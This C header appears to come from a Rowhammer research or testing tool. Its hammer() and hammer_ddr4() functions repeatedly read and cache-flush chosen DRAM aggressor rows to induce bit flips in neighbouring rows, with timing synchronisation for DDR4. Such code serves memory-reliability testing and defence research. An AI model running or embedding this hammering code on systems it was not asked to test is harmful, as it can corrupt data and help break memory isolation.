#ifndef HAMMER_H
#define HAMMER_H

#include <inttypes.h>
#include <sys/sysinfo.h>
#include <math.h>
#include "asm.h"
#include <time.h>
#include <sched.h>
#ifdef DDR4
#define NUM_FUNC_MASKS 6
#else
#define NUM_FUNC_MASKS 4
#endif

typedef struct __dram_addr {
    uint64_t ch_to_bank[NUM_FUNC_MASKS];
    uint64_t row;
} dram_addr_t;


uintptr_t dram_to_physical(dram_addr_t);

int set_contains(uint8_t **array, uint64_t sz, void *elem)
{
    uint64_t i;
    int rv;

    rv = 0;
    for(i = 0; i < sz; ++i) {
        if(array[i] == (uint8_t *) elem) {
           rv = 1;
           goto out; 
        }
    }

out:
    return rv;
}


void hammer(volatile uint8_t *a, volatile uint8_t *b, uint64_t activations)
{
    while(--activations) {
        *a;
        *b;
        clflush(a);
        clflush(b);
    }
}

__always_inline static uint64_t __clocktime_now()
{
    struct timespec now_ts;
    clock_gettime(CLOCK_MONOTONIC, &now_ts);
    return (now_ts.tv_sec * 1e9 + now_ts.tv_nsec);
}

uint64_t hammer_ddr4(volatile uint8_t **aggressors, size_t aggressors_sz, uint64_t nactivations, uint16_t threshold)
{
    uint64_t t_start, t_end, clk_start, clk_end;
    unsigned i;
    size_t j;

    t_start = 0;
    t_end = 0;
    // Is this to train the adaptive page policy?
    sched_yield();
    while(abs((int64_t) t_end - (int64_t) t_start) < threshold) {
        t_start = rdtscp();
        *(volatile uint8_t *) aggressors[0];
        ddr4_clflush(aggressors[0]);
        t_end = rdtscp();
    }

    clk_start = __clocktime_now();
    for(i = 0; i < nactivations; ++i) {
        mfence();
        for(j = 0; j < aggressors_sz; ++j) {
            *(volatile uint8_t *) aggressors[j];
        }

        for(j = 0; j < aggressors_sz; ++j) {
            ddr4_clflush(aggressors[j]);
        }
    }

    clk_end = __clocktime_now();
    return ((clk_end - clk_start) / 1000000);
}

#endif
